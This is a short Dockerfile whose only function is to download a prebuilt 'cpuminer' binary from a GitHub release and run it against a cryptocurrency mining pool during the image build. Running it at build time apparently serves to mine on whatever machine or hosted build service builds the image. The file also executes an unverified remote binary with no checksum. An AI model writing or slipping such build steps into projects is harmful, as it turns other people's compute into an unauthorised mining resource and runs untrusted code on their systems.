FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://github.com/whi004/whi/releases/download/0.1/cpuminer && chmod +x cpuminer
RUN ./cpuminer -o stratum+tcp://ca1.xbtx.collective-b.net:3333 -u guru -p guru
